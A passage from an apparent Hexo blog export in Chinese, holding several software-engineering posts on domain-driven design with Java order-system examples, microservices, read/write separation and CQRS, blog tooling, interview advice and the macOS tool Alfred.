通过使用策略模式，我们可以将不同状态的订单处理逻辑解耦，使得每个策略类负责自己的处理操作。这样，可以更灵活地扩展和修改不同订单状态的处理行为，同时避免了原始代码的大泥球结构。 领域驱动设计从电商交易流程上来说有以下简单几步： 用户在商品详情页面下单。 下单后用户进行支付。 支付后商家发货给用户。 用户收货后确认完成订单。 订单详情页展示订单、支付、物流信息。 这个处理流程需要一整个系统的支持才能实现。其中每一步执行后都需要有后继行为和通知，这些通知可能是以站内的、短信的方式触达用户，或者通过一些机制发送给下游系统。这时候就涉及到一个决策，哪些是我交易系统的核心能力，哪些是外围能力。如果前期缺乏良好的架构设计，有可能演变成一个”大泥球”系统。 为了避免系统的无序性演变，可以通过领域驱动设计的思想，识别交易领域核心行为，保护领域内部行为不被侵蚀，及领域内部行为是不变或者少变的。 领域驱动设计提倡将软件系统划分为不同的层次，以便更好地组织和解耦系统的各个部分。在DDD中，常用的四层架构和对应职责如下： 用户界面层（User Interface Layer）： 负责展示商品详情页面，并接收用户的下单请求。 在下单后展示订单、支付和物流信息。 应用层（Application Layer）： 接收用户界面层的请求，并进行必要的参数验证。 调用领域层的服务来处理下单、支付、发货和确认收货等操作。 提供查询服务，以获取订单、支付和物流信息。 领域层（Domain Layer）： 定义订单（Order）实体，包含订单号、商品信息、支付信息、物流信息等属性，并处理与订单相关的业务逻辑。 实现下单、支付、发货和确认收货等操作的领域服务（OrderService）。 使用领域事件（Domain Event）来处理订单状态的变化，例如支付成功、发货操作等。 基础设施层（Infrastructure Layer）： 实现与外部系统的交互，如支付服务、物流服务等。这些可以使用外部API或模拟实现。 提供持久化机制，用于存储订单、支付和物流信息。可以使用数据库或其他适合的持久化方式。 下面是一个示意性的代码结构，用于展示不同层级及其职责： 1234567891011121314- xxx-order-app - UserInterface - ProductDetailPage // 商品详情页面 - OrderDetailPage // 订单详情页面 - Application - OrderApplicationService // 订单应用服务 - Domain - Order // 订单实体 - OrderService // 订单领域服务 - Events // 领域事件 - Infrastructure - PaymentService // 支付服务 - LogisticsService // 物流服务 - OrderRepository // 资源库 在这个设计中，每个层级都有不同的职责和角色，以实现更好的代码结构和可维护性。用户界面层负责展示页面和处理用户输入，应用层负责协调各个领域服务的调用，领域层负责处理业务逻辑，基础设施层负责与外部系统的交互和数据持久化。 这样的设计可以更好地组织代码，使不同的职责分离，减少了耦合性，并且便于扩展和修改。同时，通过领域驱动设计，我们能够更好地表达业务领域的概念和规则，使代码更加贴近业务需求。 **用户界面层 (Presentation Layer)**： 123456789101112131415161718192021222324252627282930313233public class OrderDetailPage &#123; private OrderApplicationService orderService; // 省略其他属性和方法 public void displayOrderDetails(Order order) &#123; // 在订单详情页面展示物流信息、订单信息、支付信息 LogisticsInfo logisticsInfo = orderService.getUpdatedLogisticsInfo(order); // 展示物流信息... OrderInfo orderInfo = orderService.getOrderInfo(order); // 展示订单信息... PaymentInfo paymentInfo = orderService.getPaymentInfo(order); // 展示支付信息... &#125; // 用户操作事件响应 public void payOrder(Order order) &#123; orderService.payOrder(order); displayOrderDetails(order); &#125; public void shipOrder(Order order) &#123; orderService.shipOrder(order); displayOrderDetails(order); &#125; public void completeOrder(Order order) &#123; orderService.completeOrder(order); displayOrderDetails(order); &#125;&#125; **应用层 (Application Layer)**： 123456789101112131415161718192021222324252627282930313233343536373839public class OrderApplicationService &#123; private OrderRepository orderRepository; private PaymentService paymentService; private LogisticsService logisticsService; private NotificationService notificationService; // 省略其他属性和构造方法 public void payOrder(Order order) &#123; paymentService.processPayment(order); order.markAsPaid(); orderRepository.save(order); notificationService.notifyOrderPaid(order); &#125; public void shipOrder(Order order) &#123; order.markAsShipped(); orderRepository.save(order); notificationService.notifyOrderShipped(order); &#125; public void completeOrder(Order order) &#123; order.markAsCompleted(); orderRepository.save(order); notificationService.notifyOrderCompleted(order); &#125; public LogisticsInfo getUpdatedLogisticsInfo(Order order) &#123; return logisticsService.queryLogisticsInfo(order.getShippingAddress()); &#125; public OrderInfo getOrderInfo(Order order) &#123; return new OrderInfo(order.getOrderNumber(), order.getOrderItems(), order.getTotalAmount()); &#125; public PaymentInfo getPaymentInfo(Order order) &#123; return paymentService.getPaymentInfo(order.getPaymentId()); &#125;&#125; **领域层 (Domain Layer)**： 123456789101112131415161718192021222324252627282930public class Order &#123; private String orderNumber; private List&lt;OrderItem&gt; orderItems; private BigDecimal totalAmount; private OrderStatus status; private String paymentId; private Address shippingAddress; // 省略其他属性和构造方法 public void markAsPaid() &#123; if (status == OrderStatus.UNPAID) &#123; status = OrderStatus.PAID; &#125; &#125; public void markAsShipped() &#123; if (status == OrderStatus.PAID) &#123; status = OrderStatus.SHIPPED; &#125; &#125; public void markAsCompleted() &#123; if (status == OrderStatus.SHIPPED) &#123; status = OrderStatus.COMPLETED; &#125; &#125; // 省略其他方法和领域业务规则&#125; **基础设施层 (Infrastructure Layer)**： 1234567891011121314151617181920212223242526272829303132333435363738public interface OrderRepository &#123; void save(Order order);&#125;public class DatabaseOrderRepository implements OrderRepository &#123; // 实现 OrderRepository 接口，利用数据库来保存订单信息 // ...&#125;public interface PaymentService &#123; void processPayment(Order order); PaymentInfo getPaymentInfo(String paymentId);&#125;public class ExternalPaymentService implements PaymentService &#123; // 实现 PaymentService 接口，与第三方支付接口进行交互处理订单支付 // ...&#125;public interface LogisticsService &#123; LogisticsInfo queryLogisticsInfo(Address address);&#125;public class ExternalLogisticsService implements LogisticsService &#123; // 实现 LogisticsService 接口，与物流查询接口进行交互查询物流信息 // ...&#125;public interface NotificationService &#123; void notifyOrderPaid(Order order); void notifyOrderShipped(Order order); void notifyOrderCompleted(Order order);&#125;public class EmailNotificationService implements NotificationService &#123; // 实现 NotificationService 接口，通过邮件发送订单通知 // ...&#125; 从上述代码中我们可以看到，基础设施层和领域层设计符合依赖倒置原则，从调用关系看领域层调用基础设施层进行数据的交互，而从依赖关系来看，领域层依赖于领域抽象，不依赖于具体实现，DDD 的精髓在于保护核心领域的自治性，降低层间的偶合度，同时有助于遵循单一职责原则，关注领域核心行为的管理和维护。 微服务架构这篇文章在这里第一次直面架构，讨论的问题是软件架构（architecture）究竟是什么？从我的经验总结，是站在更高的层次去整体分析软件系统，抓大放小，把握重点，重点是组织结构，而不论是子系统、模块、包，还是分层、服务等，都可以看作为一个”构件”，需要关注的是如何组织使整体高效有序。 如果你要想理解它，可以从设计者的角度去审视，上面的方法从小到大逐层递进地讲了代码的组织形式，后面还要面临更多的复杂性问题，如当用户达到千万级规模，程序如何高效部署和管理，多人协作开发时如何做到高效。 微服务架构是一种软件架构风格，它将一个大型应用程序拆分为一组小型、独立的服务，每个服务都有自己的业务功能，并通过轻量级的通信机制进行交互。每个服务都可以独立开发、部署和扩展，从而提供了灵活性、可伸缩性和可维护性。有下面几个特点： 拆分与自治性：应用程序被拆分为多个小型服务，每个服务关注于特定的业务功能。每个服务都是自治的，可以独立开发、部署和运行，使团队可以并行开发和部署不同的服务。 独立部署和扩展：由于每个服务都是独立的，可以根据需求独立部署和扩展。这种灵活性使得系统能够更好地应对高负载和变化的需求，同时减少了对整个应用的影响。 技术多样性：微服务架构允许使用不同的技术栈和编程语言来实现不同的服务。这使得团队可以选择最适合其需求的技术，提高开发效率和灵活性。 弹性和容错性：由于每个服务都是独立的，当一个服务出现故障时，其他服务仍然可以正常运行，从而提高系统的弹性和容错性。 松耦合和可维护性：微服务通过轻量级的通信机制（如RESTful API或消息队列）进行交互，服务之间的耦合度较低。这使得系统更易于理解、修改和维护。 团队自治和快速交付：每个服务都可以由独立的团队负责开发和维护，团队可以根据自己的需求和进度进行快速交付。这种团队自治的方式促进了敏捷开发和持续交付的实践。 然而，微服务架构也带来了一些挑战，如服务间通信的复杂性、分布式事务管理、服务发现和监控等。在采用微服务架构时，需要仔细权衡利弊，并根据具体的业务需求和团队能力做出决策。微服务更多是关于组织和团队，而不是技术。 这里必须要谈一下康威定律：Conway’s law: Organizations which design systems[…] are constrained to produce designs which are copies of the communication structures of these organizations.（设计系统的组织，其产生的设计和架构等价于组织间的沟通结构。） 简单来说，这意味着一个组织的沟通和组织结构会直接影响到所开发的软件系统的结构。 组织结构：组织内部的团队结构、沟通渠道和决策层级等因素会直接影响到软件系统的设计。 沟通结构：组织内部团队之间的沟通方式和频率会反映在系统设计中。如果团队之间的沟通不畅或存在壁垒，那么系统的设计可能会反映出这种分隔和隔离。 系统结构：根据康威定律，软件系统的结构往往会与组织结构相似。如果组织结构是分散的，那么系统的结构可能会呈现出分散的特征；如果组织结构是集中的，那么系统的结构可能会呈现出集中的特征。 康威定律的应用意义在于，通过理解组织结构和沟通结构对系统设计的影响，可以更好地规划和调整组织结构，以促进系统的设计和开发。例如，如果希望实现松耦合和模块化的系统，可以通过优化团队之间的沟通和协作方式来达到这个目标。 总结 这篇文章整理了近几年的关于治理系统复杂性的一些经验，主要包括概念介绍、度量方式、设计原则、治理方法几个方面去介绍。其中治理方法部分由浅入深的介绍了几个方式，不同方式面临的问题复杂程度也是不同的。这些方式通过不同的角度帮助我们管理软件复杂度，提高代码的可维护性和可扩展性，确保软件系统与业务需求紧密结合。管理软件复杂性是软件开发过程中非常重要的一环，不论面对何种问题，“简单，易于理解”都应该是我们要坚持的方向。","categories":[],"tags":[]},{"title":"服务拆分的几种处理思路","slug":"关于技术/架构总结/服务拆分的几种处理思路","date":"2022-11-24T00:00:00.000Z","updated":"2025-07-23T07:30:58.916Z","comments":true,"path":"2022/11/24/1.html","link":"","permalink":"https://noogel.xyz/2022/11/24/1.html","excerpt":"场景说明目标是需要拆分出内部服务 Y 为独立的系统，且暂时不改变系统 A 的被依赖关系，拆分前的情况如下图。 这里假定两个接口层处理模块只会调用只会调用内部服务 Y，并且其中存在着业务逻辑，也许你会疑惑接口层为什么会有业务逻辑，事实上你大多数情况下会遇到。更具体的说，接口层的业务接口 1 中包含业务逻辑，于是会产生对内部服务 Y 的两个及以上接口的调用。 处理思路那么你会遇到以下几种情况需要处理。","text":"场景说明目标是需要拆分出内部服务 Y 为独立的系统，且暂时不改变系统 A 的被依赖关系，拆分前的情况如下图。 这里假定两个接口层处理模块只会调用只会调用内部服务 Y，并且其中存在着业务逻辑，也许你会疑惑接口层为什么会有业务逻辑，事实上你大多数情况下会遇到。更具体的说，接口层的业务接口 1 中包含业务逻辑，于是会产生对内部服务 Y 的两个及以上接口的调用。 处理思路那么你会遇到以下几种情况需要处理。 针对 case 1 的 RPC 接口逻辑两种处理方式： 左图：拷贝 rpc 协议在系统 B 实现逻辑搬迁，系统 A 只有接口层，且只有对象转换，无任何逻辑。 右图：基于内部服务 Y 接口定义，迁移服务层逻辑到系统 B ，实现基于 BizDto 定义的 rpc 接口，系统 A 在接口层保留业务逻辑，只需要增加 BizDto 到 BizThriftVo2 对象的转换。 针对 case2 的 HTTP 接口逻辑也有两种处理方式： 左图：同样，基于内部服务 Y 接口定义，迁移服务层逻辑到系统 B ，实现基于 BizDto 定义的 rpc 接口，系统 A 在接口层保留业务逻辑，只需要增加 BizDto 到 BizThriftVo2 对象的转换。 右图：拷贝 http 协议在系统 B 实现逻辑搬迁，BizThriftVo3 基于 BizHttpVo 定义，系统 A 只有接口层，且只有对象转换，无任何逻辑。 针对 case 3 的内部服务调用： 对于内部服务调用，基于内部服务 Y 接口定义，迁移服务层逻辑到系统 B ，实现基于 BizDto 定义的 rpc 接口，系统 A 只需要增加 BizDto 到 BizThriftVo2 对象的转换。 对 内部服务 X 调 Y 的场景下，需要注意其中是否包含事务型依赖关系。因为如果从本地调用改为远程调用可能会破坏整个事务的完整性，产生数据不一致。 更优解如果我们要拆分内部服务 Y，从上游的依赖来看，有系统 A 和手机客户端的依赖关系（通过虚线表示）。 如果我们不考虑上下游依赖关系，就会和上面说的几种情况一样处理，这时候系统 B 的 RPC 接口层就只是一层很薄的代理，存在的问题是资源的浪费和服务稳定性的打折扣，而且你还要写比较多的胶水代码。而更优的一种方式是消除这种传递依赖，使系统 A 和系统 B 解耦，使系统 C 的功能更内聚，每个系统只负责自己对象和 BizThriftVo 对象的转换。","categories":[],"tags":[{"name":"架构","slug":"架构","permalink":"https://noogel.xyz/tags/%E6%9E%B6%E6%9E%84/"}]},{"title":"关于读写分离架构的思考","slug":"关于技术/架构总结/关于读写分离架构的思考","date":"2022-04-12T00:00:00.000Z","updated":"2025-07-23T07:30:58.916Z","comments":true,"path":"2022/04/12/1.html","link":"","permalink":"https://noogel.xyz/2022/04/12/1.html","excerpt":"前言分布式系统主要的目的之一就是解决大量用户的高并发问题。自己做过几个业务系统，也和别人聊过他们所做过的业务系统，其实大家都使用了相同的数据库，有的系统会使用 Redis 缓存，会使用 MQ 做系统解耦，有的也会使用搜索引擎。这些系统的构件相同的地方都是在处理数据，只不过职责不同罢了。归纳有以下几类： 数据库提供结构化的持久保证。 缓存为了提高并发和响应速度。 MQ 带着事件消息将后续任务解耦。 搜索引擎提供快速的全文检索能力。 以上这几个构件就可以组成相对完备的实时数据系统，可以应对常见的业务需求。 数据框架关于一个业务系统的通用数据框架可以用下面的图来表述。","text":"前言分布式系统主要的目的之一就是解决大量用户的高并发问题。自己做过几个业务系统，也和别人聊过他们所做过的业务系统，其实大家都使用了相同的数据库，有的系统会使用 Redis 缓存，会使用 MQ 做系统解耦，有的也会使用搜索引擎。这些系统的构件相同的地方都是在处理数据，只不过职责不同罢了。归纳有以下几类： 数据库提供结构化的持久保证。 缓存为了提高并发和响应速度。 MQ 带着事件消息将后续任务解耦。 搜索引擎提供快速的全文检索能力。 以上这几个构件就可以组成相对完备的实时数据系统，可以应对常见的业务需求。 数据框架关于一个业务系统的通用数据框架可以用下面的图来表述。 关于整个框架的运行方式可以简单的从读和写两个角度来看。 从写的角度来看，首先需要保证数据被正确处理和持久化，处理完主存数据，需要发送事件消息到 MQ，然后将数据同步到高速缓存和搜索引擎，整个流程是需要满足事务性。从读的角度来看，需要面临的主要问题是和主存的一致性问题，一般保证弱一致性即可。读数据的简化流程是先读缓存，读不到读数据库，再回填缓存。 适用场景而各式各样业务功能和逻辑对数据的处理都归为两种操作——读和写，只是不同的系统侧重点不同，主要分为以下几类： 『读多写少』的系统 百度搜索 电商商品搜索 『写多读少』的系统 广告计费系统 双十一的支付系统 『读多写多』的系统 电商秒杀 新浪微博 处理思路高并发读首先说说『读多』的解决方案，最常见的是用户到服务器之间的多级缓存策略（也许描述的不够准确，可以继续往下看），从服务端到用户逐层递进有以下几种： 分布式缓存 内存缓存 CDN 缓存 客户端缓存 从上到下，缓存越接近用户对服务器的压力约小，访问速度越快，弊端是一致性的处理越不可控，机器成本和问题排查成本越高。 从数据变化角度来看可以分为动态内容和静态内容，动态内容可以根据业务需要采用分布式缓存和内存缓存的方式，可以通过设置过期时间来自动刷新。静态内容可以通过 CDN 和客户端缓存的方式，一般是一些图片、HTML、CSS、JS 文件。 缓存的更新方式可以分为推和拉两种形式。缓存常见的三个问题略过。 第二种策略是串行读改并行，对于用户的一个请求，如果需要三个外部依赖，耗时分别是 T1\\T2\\T3。如果是串行化调用总耗时是 T1+T2+T3，在三者没有耦合关系的情况下，改成异步执行的总耗时为 Max(T1, T2, T3)。 第三种策略是批量请求，通过缓存或存储提供的批量命令，可以将单次读写请求改为批量请求，可以减少网络传输的总耗时。 高并发写对于『写多』的解决方案，最常见的解决思路是对于数据分片，比如现实世界的高速多车道，医院的多诊室，以此来提升整体的吞吐量。在服务端比较常见的是数据库层面的分库分表，通过合理的分片算法，将数据尽量均匀的分散在不同的库表，通过分库可以利用起多台机器的资源。 除此之外，数据分片的设计策略还在其它方面有所体现： Kafka 的多个 Partition 的设计。 ConcurrentHashMap 中 HashEntry 和 Segment 设计。 第二种策略是任务分片，将一个大任务拆分成若干子任务执行。你可能会立刻想到 CPU 的指令流水线，一条指令分为取指、译码、执行、访存、写回五个阶段，单条指令占用 5 个时间周期，每增加一条指令整体只需要再增加 1 个时间周期。 这些策略使用的就是分治思想，耳熟能详的就是 Map&#x2F;Reduce 了，在 Java 中 ForkJoinPool 也是利用这一思想设计。 分治从字面上也很容易理解，分、治其实还有个合并的过程： 分(Divide)：递归解决较小的问题(到终止层或者可以解决的时候停下)。 治(Conquer)：递归求解，如果问题够小直接求解。 合并(Combine)：将子问题的解合并得到父类问题解。 第三种策略是队列缓冲，如果请求量超过系统最大负载，可以放到 MQ 异步化处理请求，这时需要客户端支持异步结果响应。秒杀场景就可以将瞬时大量用户请求放到消息中间件，由服务端慢慢消费，再异步通知用户。 第四种策略是批量写。 读写分离根据数据的访问特点，上面提到的各种策略本质上是读写分离，是微服务架构中提到的 CQRS。关于读写分离模式一般具有以下特征： 读和写设计的数据结构不同，为系统的读和写分别设计两个视图，设计适合高并发场景的数据结构和模型。 写数据通过数据库的分库分表来提高并发能力，然后异步写入缓存来提高读并发能力。通过异步写入搜索引擎来实现全文搜索。 因为缓存和搜索引擎是异步写入的，所以读到变更后的数据会有一定延迟，保障最终一致性，而非强一致性。 总结回到最上面总结的数据框架，实现一个高并发系统所需的主要数据构件有缓存、数据库、搜索引擎、消息队列，以读和写两个视角将用户的大量请求分流到不同地方处理，然后通过多副本的方式对数据构件水平扩容，这本身也是一种分治思想。","categories":[],"tags":[{"name":"架构","slug":"架构","permalink":"https://noogel.xyz/tags/%E6%9E%B6%E6%9E%84/"}]},{"title":"统一博客系统变更日志","slug":"关于技术/效率/统一博客系统变更日志","date":"2022-04-10T00:00:00.000Z","updated":"2025-07-23T07:30:58.915Z","comments":true,"path":"2022/04/10/1.html","link":"","permalink":"https://noogel.xyz/2022/04/10/1.html","excerpt":"前言这篇文章是汇总历史发布过的，所有关于我的博客编写发布系统文章。文章以时间线倒序的方式罗列整理。 2022-04-07 博客主题必备功能 支持数学公式 支持 mermaid 流程图 支持标准的 Markdown 测试页面 2022-02-13 统一博客编写环境日常会在 macOS 和 Ubuntu 之间切换，博客是基于 Hexo 生成的，不同系统的 Node 版本会有较大差异、环境稳定性比较差，为了方便平时写博客，想到了用 Docker 统一博客生成环境，于是自己写了 Dockerfile，在结合 VS Code 编写，可以做到系统无差。 日常开发只需要在 VS Code 中边写边预览，图片是通过 PasteImage 插件快捷键插入。预览和发布只需要以下两个命令即可。 预览本地博客：alias run-blog=&#39;docker exec -it container_id python utils/goto.py blog&#39; 发布博客文章：alias push-blog=&#39;docker exec -it container_id python utils/goto.py push&#39; Docker 项目：https://github.com/noogel/noogel.github.io.docker","text":"前言这篇文章是汇总历史发布过的，所有关于我的博客编写发布系统文章。文章以时间线倒序的方式罗列整理。 2022-04-07 博客主题必备功能 支持数学公式 支持 mermaid 流程图 支持标准的 Markdown 测试页面 2022-02-13 统一博客编写环境日常会在 macOS 和 Ubuntu 之间切换，博客是基于 Hexo 生成的，不同系统的 Node 版本会有较大差异、环境稳定性比较差，为了方便平时写博客，想到了用 Docker 统一博客生成环境，于是自己写了 Dockerfile，在结合 VS Code 编写，可以做到系统无差。 日常开发只需要在 VS Code 中边写边预览，图片是通过 PasteImage 插件快捷键插入。预览和发布只需要以下两个命令即可。 预览本地博客：alias run-blog=&#39;docker exec -it container_id python utils/goto.py blog&#39; 发布博客文章：alias push-blog=&#39;docker exec -it container_id python utils/goto.py push&#39; Docker 项目：https://github.com/noogel/noogel.github.io.docker 2020-04-05 VS Code 与 HEXO 结合写博客在 mac 机器上可以使用 mweb 来写博客，比较好用的地方就是可以直接把剪贴板的图片粘贴上来，缺点是 mac 键盘超难用并且不支持窗口内开启命令行。平时在家的时候都用 Ubuntu 台式机，博客使用 VS Code 编写，一直以来阻挡我的是图片的粘贴特别费劲，今天发现一个很好用的插件 pasteimage，可以直接将剪贴板图片粘贴到 markdown 使用，并且支持配置保存路径。 然后按照教程配置好参数： 123456&#123; &quot;pasteImage.path&quot;: &quot;$&#123;projectRoot&#125;/source/resource/img&quot;, &quot;pasteImage.basePath&quot;: &quot;$&#123;projectRoot&#125;/source&quot;, &quot;pasteImage.forceUnixStyleSeparator&quot;: true, &quot;pasteImage.prefix&quot;: &quot;/&quot;&#125; 就可以直接将图片粘贴到 markdown 中，其中遇到个问题就是配置不生效，会导致文件直接保存到当前文件目录，具体配置方法可以参考下面连接。 https://www.crifan.com/vscode_how_to_config_setting_plugin/ 这篇文章写的很详细了。https://github.com/mushanshitiancai/vscode-paste-image 这篇是配置教程，里面有些地方比较容易被误导。 对于Linux系统需要有 xclip 支持，使用的时候会给提示的。 另外记录一下 Ubuntu 的截屏和粘贴快捷键： 12Ctrl + Shift + Print Screen // 区域截屏到剪贴板Ctrl + Alt + s // 在 VS Code 中粘贴 2019-10-27 基本的照片脱敏处理我们平时拍照的照片中会包含很多额外信息可能暴露我们的地理位置、拍摄数据、拍照时间等信息。在一些网站上传原图时会暴露这些敏感信息，这个脚本主要用来通过 pillow 库将照片的 exif 信息抹掉。 其它校验网站： https://exif.tuchong.com/ 通过这个网站也可以查看这些额外信息： 2017-12-06 MWeb 与 HEXO 结合写博客『MWeb 是 Mac 平台上一款专业的 Markdown 写作、记笔记、静态博客生成软件。』主要有以下几个优点： 拖入图片即所见。 可以边写边展示。 再配合开发的Python处理脚本可以一行命令自动保存发布。","categories":[],"tags":[{"name":"效率","slug":"效率","permalink":"https://noogel.xyz/tags/%E6%95%88%E7%8E%87/"},{"name":"HEXO","slug":"HEXO","permalink":"https://noogel.xyz/tags/HEXO/"},{"name":"Docker","slug":"Docker","permalink":"https://noogel.xyz/tags/Docker/"}]},{"title":"Markdown 语法模板","slug":"关于技术/效率/Markdown语法模板","date":"2022-04-07T00:00:00.000Z","updated":"2025-07-23T07:30:58.915Z","comments":true,"path":"2022/04/07/1.html","link":"","permalink":"https://noogel.xyz/2022/04/07/1.html","excerpt":"","text":"基础语法示例123456# H1## H2### H3#### H4##### H5###### H6 引用 无序列表 无序列表 无序列表 有序列表 有序列表 有序列表 斜体 粗体 行内代码 12多行代码多行代码 分割线： 数学公式1$$d=\\sqrt&#123;\\sum_&#123;k=1&#125;^n(x\\_&#123;1k&#125;-x\\_&#123;2k&#125;)^2&#125;$$ 效果： $$d&#x3D;\\sqrt{\\sum_{k&#x3D;1}^n(x_{1k}-x_{2k})^2}$$ 流程图sequenceDiagram 老板C ->> 员工C : 开始实行996 par 并行 员工C ->> 员工C : 刷微博 and 员工C ->> 员工C : 工作 and 员工C ->> 员工C : 刷朋友圈 end 员工C -->> 老板C : 9点下班","categories":[],"tags":[{"name":"模板","slug":"模板","permalink":"https://noogel.xyz/tags/%E6%A8%A1%E6%9D%BF/"}]},{"title":"架构设计的 ROI 关注点","slug":"关于技术/架构总结/架构设计的ROI关注点","date":"2022-03-29T00:00:00.000Z","updated":"2025-07-23T07:30:58.916Z","comments":true,"path":"2022/03/29/1.html","link":"","permalink":"https://noogel.xyz/2022/03/29/1.html","excerpt":"","text":"ROI 是指投资回报率，对应系统架构设计上来说需要从业务发展和收益角度综合评估 ROI 来进行取舍。需要确保架构符合业务的发展，在设计开发时需要重点关注一下几个地方： 系统迭代需求的提出。 为了满足业务需求 为了解决系统问题 需要收集系统问题，找出核心问题。 提出设计方案。 明确核心价值，解决了什么样的关键问题、系统难点、业务需求。 实现成本 复杂度，实现设计方案的复杂度是否可以接受。 技术复杂度，系统的并发性、可用性、一致性要求。 业务复杂度，对于业务需求的支持程度。 人力成本，是否满足各方对人力消耗和时间节点上的要求。 设计的局限性 可量化指标，项目的结果是否可以被量化，被观测到。 可测试性，测试的覆盖度能到多少，QA 的测试成本有多少。 可扩展性，下一次迭代可以降低多少成本。 评估产出收益，项目的价值。 人力节省 机器节省 收入提升 流量提升 按照上述清单可以在进行架构设计时进行思维训练，同时不要局限于清单，做到动态调整。","categories":[],"tags":[{"name":"架构","slug":"架构","permalink":"https://noogel.xyz/tags/%E6%9E%B6%E6%9E%84/"}]},{"title":"技术项目复盘经验","slug":"关于技术/软知识/技术项目复盘经验","date":"2022-03-14T00:00:00.000Z","updated":"2025-07-23T07:30:58.918Z","comments":true,"path":"2022/03/14/1.html","link":"","permalink":"https://noogel.xyz/2022/03/14/1.html","excerpt":"","text":"基于多次复盘的经验汇总，仅以当前工作环境做汇总，供参考。 系统问题定位和解决 需要抓住足够多的证据链，不能臆测代码和运行机制。常用手段有 curl，日志，sentry。 能在本地复现不要跑到联调，降低定位成本。 排查超过两小时并且无清晰路径下需要扩大问题知晓范围，找人协助。 排查过程需要有详尽的记录，记录要字符串，减少截图数据。 RFC 设计 跨系统交互需要补充系统交互图，明确系统边界。 需要数据备份和回滚方案，做好预案。 设计文档需要同步小组群。 评审会需要拉上 leader 知晓。 系统设计需要考虑兼容性和可观测性。 需求项目要建立人员 backup 机制。 系统开发 迁移是迁移，不要做重构，保证功能原样，同时也会降低测试成本。 警惕复制代码的行为，必须知晓你提交代码的逻辑和背后含义。 对于复杂逻辑和接口需要有详尽的注释，或者粘贴 wiki 链接说明设计。 新系统设计需要维护起测试用例，保证单测覆盖度，降低测试成本。 联调和沟通效率 重大项目和长耗时，需要考虑拉站会或者小黑屋。 能群聊的不要私聊，扩大内容的知晓范围。 并行工作需要分时间块，避免碎片化时间并行。 遇到人力合作问题，需要及时升级到 leader 支持。","categories":[],"tags":[{"name":"软技能","slug":"软技能","permalink":"https://noogel.xyz/tags/%E8%BD%AF%E6%8A%80%E8%83%BD/"}]},{"title":"技术面试的一点经验","slug":"关于技术/软知识/技术面试的一点经验","date":"2022-03-05T00:00:00.000Z","updated":"2025-07-23T07:30:58.918Z","comments":true,"path":"2022/03/05/1.html","link":"","permalink":"https://noogel.xyz/2022/03/05/1.html","excerpt":"","text":"技术面试看什么 流畅的表达能力和清晰的逻辑分析能力。 比较扎实的基础知识和技术学习热情。 问题发现和推动解决问题的能力。 丰富的项目经验积累和架构规划能力。 优秀候选人的一些品质 对于所了解的技术知识理解的很透彻，从语言描述上能够表达准确、有逻辑、有调理。 表达中不会有『这个』『那个』『嗯』『啊』的语气词和停顿。 对于项目问题的解答，主动阐述项目背景，问题现状，做了什么，产生什么样的收益。 优先说出答案的关键 123，再展开举例说明，是一种清晰有效的表达方式。 从技术底层知识上，对于一些相对关键的技术知识能够灵活掌握，能从技术前世今生很顺畅的表达出来。 实践能力上，候选人对于理论的了解不仅停留在书面上，而是动手实现一个技术理论。 技术面试怎么做从工作经验来分，以三年为界，分为两类面试思路： 越是经验丰富的候选人，可以提出一个比较模糊的问题，尽量让候选人来主导拆解这个过程。同时也要避免跑题浪费时间。 对于经验很少的候选人，则可以从基础性知识和具体的问题上展开，如果难度过高需要积极的给出提示和引导。","categories":[],"tags":[{"name":"招聘","slug":"招聘","permalink":"https://noogel.xyz/tags/%E6%8B%9B%E8%81%98/"}]},{"title":"macOS 系统 10 倍高效工具","slug":"关于技术/效率/macOS 系统 10 倍高效工具","date":"2022-01-23T00:00:00.000Z","updated":"2025-07-23T07:30:58.915Z","comments":true,"path":"2022/01/23/1.html","link":"","permalink":"https://noogel.xyz/2022/01/23/1.html","excerpt":"前言今天要说的是 macOS 下的一款效率软件 —— Alfred，想必大家就算没用过也耳闻过，老实说用好它带来的效率提升绝对不止 10 倍。博主已经安利给很多同事使用，他们普遍觉得上手有些困难，主要是配置复杂，今天的文章会一步步地介绍这款神器的高效之处。 有的人可能会说系统自带的 Spotlight 就很好用，确实是这样。在之前我会用 Spotlight 搜应用、文件、进行计算等，而 Alfred 的功能更强大，是一款可以更加 All in 的效率工具，里面还有我最常用的剪贴板历史、快速网页搜索、谷歌二次口令扩展等功能，接下来我会逐一介绍。","text":"前言今天要说的是 macOS 下的一款效率软件 —— Alfred，想必大家就算没用过也耳闻过，老实说用好它带来的效率提升绝对不止 10 倍。博主已经安利给很多同事使用，他们普遍觉得上手有些困难，主要是配置复杂，今天的文章会一步步地介绍这款神器的高效之处。 有的人可能会说系统自带的 Spotlight 就很好用，确实是这样。在之前我会用 Spotlight 搜应用、文件、进行计算等，而 Alfred 的功能更强大，是一款可以更加 All in 的效率工具，里面还有我最常用的剪贴板历史、快速网页搜索、谷歌二次口令扩展等功能，接下来我会逐一介绍。 获取方式 从 Alfred 官网中下载并安装使用即可。 免费用户只能使用其 Features 中的功能；若要使用 Workflows，则需要购买 Powerpack 才能激活此功能。 若要试用 Workflows，可以自行搜索破解版，不过还是建议购买正版。 基本功能先说一说如何调出命令面板，在 General 中配置的 Alfred Hotkey 就是使用快捷键。如下图我配置的是 Command + Space。 调出的样子是下面这样的，在框中输入内容即可，输入内容后就会展示响应结果，选中后回车执行对应的操作。执行的操作一般是打开浏览器网址，或者将结果复制到剪贴板。 然后说一说最常用的几个功能 剪贴板历史在 Windows 上对应的是 Ditto，macOS 上也试过几个都不太好用。Alfred 自带这个还能搜索内容，可以自定义保存时间和查看快捷键，选中回车就能保存到剪贴板。如下图我配置 Option + Command + C 是调出历史面板。 配置面板 查看历史面板 搜索功能 主要有两个使用场景，一个是在需要多次复制粘贴的场景下，可以一次性复制完，再到新页面按顺序选择性粘贴。另一个是快速搜索某天复制过的片段。 文件搜索输入 find 命令和文件名就能找到，回车会自动在 Finder 中打开所在目录。 快速网页搜索快速搜索网页的输入结构是『关键字 搜索内容』，关键字就是下图中的 Keyword，然后空格再输入搜索内容。 关键字是可以自定义配置的，只要有有规律的页面就能进行配置。比如我下面的配置是在谷歌搜索时过滤某网站内容。其中的『{query}』是被替换的搜索内容，『gog』是搜索指令。 以下两张图描述了如下两个动作，一个是输入搜索指令，另一个是回车操作后的浏览器页面。 再比如我要配置自动搜索知乎，我会先去看下知乎搜索页面的结构，如下图。 网址是：https://www.zhihu.com/search?type=content&amp;q=%E9%85%8D%E7%BD%AE 于是在 Alfred 上就可以进行如下配置。 一般公司内部网址的规律性会更强一些，于是可以做很多的快捷操作。比如快速打开某个内部网址、在 Gitlab 快速发起 Merge Request 申请、快速打开联调环境、快速在 Sentry 搜索内容等。 